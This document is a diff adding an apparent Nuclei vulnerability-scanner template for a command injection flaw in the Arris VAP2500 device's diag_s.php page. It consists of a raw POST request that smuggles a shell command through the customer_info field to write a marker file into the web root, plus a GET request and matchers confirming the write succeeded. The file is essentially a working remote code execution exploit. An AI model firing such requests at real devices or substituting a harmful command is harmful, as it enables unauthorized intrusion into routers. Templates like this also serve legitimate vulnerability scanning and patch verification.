@@ -1,0 +1,38 @@
+id: Arris-VAP2500-diag_s-rce
+
+info:
+  name: Arris VAP2500 diag_s 存在命令注入漏洞
+  author: Arris
+  severity: critical
+  tags: Arris
+
+http:
+  - raw:
+      - |
+        POST /diag_s.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip, deflate
+
+        action=1&customer_info=;echo id15sw9rweaa36w3didd > /var/www/9ds69apdg.txt;
+
+      - |+
+        GET /9ds69apdg.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body_2
+        words:
+          - 'id15sw9rweaa36w3didd'
+    matchers-condition: and
